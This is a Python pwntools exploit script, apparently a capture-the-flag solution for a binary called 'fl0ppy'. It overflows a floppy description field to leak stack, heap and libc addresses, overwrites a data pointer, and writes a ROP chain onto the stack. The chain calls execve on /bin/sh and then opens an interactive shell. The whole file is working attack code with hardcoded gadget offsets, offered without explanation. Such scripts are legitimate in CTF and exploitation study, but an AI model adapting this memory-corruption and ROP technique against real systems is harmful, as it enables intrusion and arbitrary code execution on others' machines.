from pwn import *


def write_floppy(p, data, description):

    p.sendline("2")
    p.recvuntil("Input your data:")
    p.sendline(data)
    p.recvuntil("Description:")
    p.sendline(description)

def modify_floppy(p, which, content):
    
    p.sendline("4")
    p.recvuntil("1 Description | 2 Data")
    p.sendline(which)
    p.recvuntil("Input")
    p.sendline(content)


def read_floppy(p):

    if p.can_recv():
        p.recv()

    p.sendline("3")

    return p.recv()

p = process("./fl0ppy")


# overflow desc of floppy_1, leaking stack.
p.sendline("1")
p.recvuntil("1 or 2?")
# select floppy 1
p.sendline("1")

# initialize floppy 1 with some trash
write_floppy(p, "a"*40, "b"*10)

# do overflow
modify_floppy(p, "1", "A"*0x10)

# read leak
buf = read_floppy(p)

stack_leak = buf.split("DESCRIPTION: ")[1].split("\n")[0]
print stack_leak

stack_leak = u32(stack_leak.split("A"*0x10)[1][-4:])

stack_base = stack_leak - 0x1f260
print "stack base: " + hex(stack_base)

libc_ptr = stack_base + 0x1f24c
# overflow desc of floppy_2 right up to char * ptr of floppy_1, leaking heap

p.sendline("1")
p.recvuntil("1 or 2?")
# select floppy 2
p.sendline("2")

# initialize floppy 2 with some trash
write_floppy(p, "a"*40, "b"*10)

# do overflow
modify_floppy(p, "1", "B"*0x14)

buf = read_floppy(p)

heap_leak = u32(buf.split("B"*0x14)[1].split("A"*0x10)[0])

print "heap leak: " + hex(heap_leak)

# overflow floppy_2, overwriting data ptr in floppy_1 to point to a libc leak on the stack
modify_floppy(p, "1", "C"*0x14 + p32(libc_ptr))

p.recvuntil(">")
# switch to floppy 1
p.sendline("1")
p.recvuntil("1 or 2?")
p.sendline("1")

buf = read_floppy(p)

print buf

libc_leak = u32(buf.split("DATA: ")[1][:4])

libc_base = libc_leak - 0x18637

print "libc base: " + hex(libc_base)


# overflow floppy2, pointing data_ptr of floppy_1 to the stack. 
# switch to floppy 2
p.sendline("1")
p.recvuntil("1 or 2?")
p.sendline("2")

p.recvuntil(">")
modify_floppy(p, "1", "C"*0x14 + p32(stack_leak - 0x18))

# modify floppy1's data, writing a rop chain to the stack.

# switch to floppy 1
p.recvuntil(">")
p.sendline("1")
p.recvuntil("1 or 2?")
p.sendline("1")

#pop_eax = libc_base + 0x0002406e

xor_eax_eax = libc_base + 0x0002c79c
xchg_eax_ecx = libc_base + 0x000fa67b
xchg_eax_edx = libc_base + 0x00033e15

inc_eax = libc_base + 0x00024b41
pop_ebx = libc_base + 0x00018395

interrupt = libc_base + 0x00002c87
bin_sh_ptr = libc_base + 0x15b9ab

ropchain = p32(xchg_eax_ecx) + p32(xor_eax_eax) + p32(xchg_eax_edx) + p32(xor_eax_eax) + p32(inc_eax)*11 + p32(pop_ebx) + p32(bin_sh_ptr) + p32(interrupt)

modify_floppy(p, "2", "D"*0x14 + ropchain)

p.sendline("5")
p.interactive()

